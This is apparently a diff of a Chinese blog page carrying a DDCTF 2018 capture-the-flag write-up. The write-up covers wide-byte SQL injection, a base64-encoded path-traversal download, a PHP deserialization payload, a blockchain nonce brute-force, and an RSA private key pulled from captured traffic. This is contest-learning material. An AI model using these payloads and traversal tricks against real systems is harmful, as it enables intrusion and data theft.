@@ -401,7 +401,7 @@
 <p>首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：</p>
 <p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</p>
 <p>进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示”DD”, 然后以此类推：</p>
-<p><img src="/posts/22230/assets/ddctf/20180420150038.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180420150038.png" alt="avatar"></p>
 <h1 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h1><ol>
 <li>下载下来是一张图片</li>
 </ol>
@@ -415,9 +415,9 @@
 <ol start="2">
 <li>然后打开file.txt</li>
 </ol>
-<p><img src="/posts/22230/assets/ddctf/20180420151247.png" alt="avatar"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>
+<p><img src="/assets/ddctf/20180420151247.png" alt="avatar"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -o . file.txt | sort |uniq -c | sort -rn</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/22230/assets/ddctf/20180420151941.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180420151941.png" alt="avatar"></p>
 <p>然后从新组合一下，就得到flag了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDCTF&#123;ZuozHengqU3dEshi&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。<br>过程如下:<br>首先大体上浏览整个数据包，会发现，大体上就是3个部分:  </p>
@@ -454,7 +454,7 @@
 <p>下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">fp = open(&quot;1.txt&quot;, &quot;r&quot;)</span><br><span class="line">fp1 = open(&quot;file.png&quot;, &quot;wb&quot;)</span><br><span class="line"></span><br><span class="line">fp1.write(base64.b64decode(fp.read()))</span><br></pre></td></tr></table></figure>
 <p>然后，就可以得到一个file.png。</p>
-<p><img src="/posts/22230/assets/ddctf/20180425151942.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180425151942.png" alt="avatar"></p>
 <p>然后，就是将图片中的字符串提取出来。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br></pre></td></tr></table></figure>
 <p>再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。</p>
@@ -462,9 +462,9 @@
 <h2 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h2><p>今天是ddctf最后一天，”喝杯java”，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。</p>
 <p>rsa密钥也就是，保存一下就行了:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/22230/assets/ddctf/20180420184445.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180420184445.png" alt="avatar"></p>
 <p>然后，查看http包，flag就出来了。</p>
-<p><img src="/posts/22230/assets/ddctf/20180420183706.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180420183706.png" alt="avatar"></p>
 <h1 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h1><h2 id="X-forwarded-for"><a href="#X-forwarded-for" class="headerlink" title="X-forwarded-for"></a>X-forwarded-for</h2><p>首先打开网页，可以看到”非法链接，只允许来自 123.232.23.245 的访问”,很容易就想到修改X-forwarded-for, Chrome下我使用<a href="https://chrome.google.com/webstore/search/modheader?hl=zh-CN" rel="external nofollow" target="_blank">Modheader</a>插件,然后修改一下X-forwarded-for就行了</p>
 <h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><p>既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。</p>
 <ul>
@@ -496,14 +496,14 @@
 </li>
 </ul>
 <h1 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>首先F12抓包，会看到一个有意思的请求，<a href="http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you" rel="external nofollow" target="_blank">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you</a> can only download .class .xml .ico .ks files”,表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。</p>
-<p><img src="/posts/22230/assets/ddctf/20180421191033.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180421191033.png" alt="avatar"></p>
 <p>其中需要注意的有三个文件，</p>
 <ul>
 <li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造”116.85.48.102:5050/flag/test/flag/DDCTF{BASD}”或类似的链接使得网站报错即可得到。</p>
-<p><img src="/posts/22230/assets/ddctf/201804211191034.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/201804211191034.png" alt="avatar"></p>
 </li>
 <li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造”116.85.48.102:5050/image/banner/[随便一个错误的地址]”或类似的链接使得网站报错即可得到。</p>
-<p><img src="/posts/22230/assets/ddctf/20180421191037.png" alt="avatar"></p>
+<p><img src="/assets/ddctf/20180421191037.png" alt="avatar"></p>
 </li>
 <li><p>_.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过”116.85.48.102:5050/base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)”,(注意，base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。</p>
 </li>
@@ -526,7 +526,7 @@
 <p>通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//        String email = &quot;email&quot;;</span><br><span class="line">//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class="line">//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class="line">//        mac.init(signingKey);</span><br><span class="line">//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line">//        System.out.println(byte2hex(e));</span><br></pre></td></tr></table></figure>
 <p>拿到该加密后的邮箱，就可以获得加密后的flag。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421191047.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421191047.png" alt="avatar"></p>
 <p>拿到加密之后的flag之后，就可以解密了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void gencipher() throws Exception &#123;</span><br><span class="line">        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);</span><br><span class="line">        String ksPath = &quot;D:\\java\\ddctf\\src\\main\\java\\sdl.ks&quot;;</span><br><span class="line">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class="line">        keyStore.load(inputStream, p.toCharArray());</span><br><span class="line">        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br><span class="line">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class="line">        cipher.init(2, key);</span><br><span class="line">        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;</span><br><span class="line">        byte[] data = cipher.doFinal(hexStringToBytes(flag));</span><br><span class="line">        System.out.println(new String(data));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可</p>
@@ -536,13 +536,13 @@
 <p>DDCTF{5218295657878818503}</p>
 </blockquote>
 <h1 id="注入的奥妙"><a href="#注入的奥妙" class="headerlink" title="注入的奥妙"></a>注入的奥妙</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号”‘“，发现输出竟然乱码。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421195946.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421195946.png" alt="avatar"></p>
 <p> 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421200130.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421200130.png" alt="avatar"></p>
 <p> 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（<a href="https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。" rel="external nofollow" target="_blank">https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。</a></p>
-<p> <img src="/posts/22230/assets/ddctf/20180421200307.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421200307.png" alt="avatar"></p>
 <p> 我选择了”么”</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421200748.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421200748.png" alt="avatar"></p>
 <p>通过测<code>http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88</code>，可以看到单引号成功逃逸。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 最后拼接的参数是 : ?\\&apos;</span><br><span class="line">~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~</span><br><span class="line">很遗憾没有找到数据 可以试试别的 ！</span><br><span class="line">42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;?\\&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
 <p>单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加”collate utf8_general_cli”,强制转换编码即可。</p>
@@ -579,18 +579,18 @@
 <p>在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Index\Helper;</span><br><span class="line"></span><br><span class="line">use Index\Helper\Flag;</span><br><span class="line">use Index\Helper\UUID;</span><br><span class="line"></span><br><span class="line">class SQL</span><br><span class="line">&#123;</span><br><span class="line">    public $dbc;</span><br><span class="line">    public $pdo;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Flag</span><br><span class="line">&#123;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql=new SQL();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// defined(&apos;ACCESS_FILE&apos;) or exit(&apos;No direct script access allowed&apos;);</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;</span><br><span class="line">    public $fl;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;hhkjjhkhjkhjkhkjhkhkhk&apos;;</span><br><span class="line">        $this-&gt;fl = new Flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        // $this-&gt;getflag(&apos;ctfuser&apos;, $this-&gt;user_uuid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new Test());</span><br></pre></td></tr></table></figure>
 <p>即可得到序列化之后的值:”hhkjjhkhjkhjkhkjhkhkhkO:17:”Index\Helper\Test”:2:{s:9:”user_uuid”;s:36:”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”;s:2:”fl”;O:17:”Index\Helper\Flag”:1:{s:3:”sql”;O:16:”Index\Helper\SQL”:2:{s:3:”dbc”;N;s:3:”pdo”;N;}}}”,然后就可以得到flag了。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421150038.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421150038.png" alt="avatar"></p>
 <h1 id="mini-blockchain"><a href="#mini-blockchain" class="headerlink" title="mini blockchain"></a>mini blockchain</h1><h2 id="构造符合条件的区块"><a href="#构造符合条件的区块" class="headerlink" title="构造符合条件的区块"></a>构造符合条件的区块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line">import string</span><br><span class="line">from functools import reduce</span><br><span class="line">import rsa</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = &apos;0&apos; * 64</span><br><span class="line"></span><br><span class="line">def hash(x):</span><br><span class="line">    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hash_reducer(x, y):</span><br><span class="line">    return hash(hash(x) + hash(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hash_block(block):</span><br><span class="line">    return reduce(hash_reducer, [block[&apos;prev&apos;], block[&apos;nonce&apos;],</span><br><span class="line">                                 reduce(hash_reducer, [tx[&apos;hash&apos;] for tx in block[&apos;transactions&apos;]], EMPTY_HASH)])</span><br><span class="line"></span><br><span class="line">block = &#123;</span><br><span class="line">    &quot;nonce&quot;: &quot;6h0F&quot;,</span><br><span class="line">    &quot;prev&quot;: &quot;0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8&quot;,</span><br><span class="line">    &quot;transactions&quot;: []</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">c = string.ascii_lowercase + &quot;0123456789ABCDEFGHI&quot;</span><br><span class="line"></span><br><span class="line">captchas = [&apos;&apos;.join(i) for i in product(c, repeat=4)]</span><br><span class="line"></span><br><span class="line">print(&apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas)))</span><br><span class="line">with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">    for k in captchas:</span><br><span class="line">        block[&quot;nonce&quot;] = k</span><br><span class="line">        f.write(hash_block(block)[:5] + &apos; --&gt; &apos; + k + &apos;\n&apos;)</span><br></pre></td></tr></table></figure>
 <p>“nonce”值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。</p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>初始区块链如图所示:</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421221550.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421221550.png" alt="avatar"></p>
 <p>然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block[‘height’]来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def find_blockchain_tail():</span><br><span class="line">    return max(session[&apos;blocks&apos;].values(), key=lambda block: block[&apos;height&apos;])</span><br></pre></td></tr></table></figure>
-<p> <img src="/posts/22230/assets/ddctf/20180421222032.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421222032.png" alt="avatar"></p>
 <p>从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421222814.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421222814.png" alt="avatar"></p>
 <p>接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。</p>
-<p> <img src="/posts/22230/assets/ddctf/20180421223014.png" alt="avatar"></p>
+<p> <img src="/assets/ddctf/20180421223014.png" alt="avatar"></p>
 <p>需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。</p>
 <h1 id="我的博客"><a href="#我的博客" class="headerlink" title="我的博客"></a>我的博客</h1><h2 id="审计代码-1"><a href="#审计代码-1" class="headerlink" title="审计代码"></a>审计代码</h2><p>根据提示，下载<a href="http://www.tar.gz,里边共有三个文件，index.php" rel="external nofollow" target="_blank">www.tar.gz,里边共有三个文件，index.php</a>, login.php, register.php。</p>
 <h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">        $title = addslashes($_GET[<span class="string">'title'</span>]);</span><br><span class="line">        $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $title = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($pdo-&gt;query($sql) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1625,6 +1625,138 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 56
@@ -1688,12 +1820,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
         <li class="archive-post-item">
